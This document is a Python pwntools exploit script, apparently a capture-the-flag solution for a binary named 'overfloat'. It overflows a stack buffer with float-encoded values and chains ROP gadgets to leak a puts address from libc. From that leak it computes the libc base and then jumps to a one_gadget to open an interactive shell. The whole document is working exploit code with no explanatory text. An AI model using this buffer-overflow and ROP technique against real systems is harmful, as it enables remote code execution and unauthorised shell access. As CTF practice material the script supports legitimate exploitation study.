#!/usr/bin/env python3
from pwn import *
import struct

exe = ELF("./overfloat_patched", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        #r = process([exe.path])
        r = gdb.debug([exe.path], gdbscript="c")
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()

def b_to_f(data):
    if len(data) != 4:
        log.error("Length of data should be 4")
        r.close()
    return str(struct.unpack('f', bytes(data))[0])


def fill_padding():
    for i in range(0xe):
        payload = b_to_f(chr(i)*4)
        print r.sendline(payload)


def send_8bytes(data):
    payload = b_to_f(data[:4])
    r.sendline(payload)
    payload = b_to_f(data[4:])
    r.sendline(payload)


def main():

    r.recvuntil(b"GO?")
    fill_padding()

    ret = p64(0x400661)
    poprdi = p64(0x400a83)
    pltputs = p64(0x400690)
    gotputs = p64(exe.got.puts)
    main = p64(0x400993)
    
    log.info("ret: " + hex(u64(ret)))
    log.info("pop rdi; ret: " + hex(u64(poprdi)))
    log.info("PLT puts: " + hex(u64(pltputs)))
    log.info("GOT puts: " + hex(u64(gotputs)))
    log.info("main function: " + hex(u64(main)))

    send_8bytes(poprdi)
    send_8bytes(gotputs)
    send_8bytes(pltputs)
    send_8bytes(main)

    r.sendline(b"done")

    r.recvline()
    r.recvline()
    leak = r.recvline()[:-1].strip('\n')
    leak = u64(leak.ljust(8, b'\x00'))

    log.info("libc leak: " + hex(leak))
    libc.address = leak - libc.sym.puts
    log.info("libc base address: " + hex(libc.address))

    one_gadget = p64(libc.address + 0x10a38c)

    fill_padding()
    send_8bytes(one_gadget)

    r.sendline(b"done")
    r.interactive()

if __name__ == "__main__":
    main()
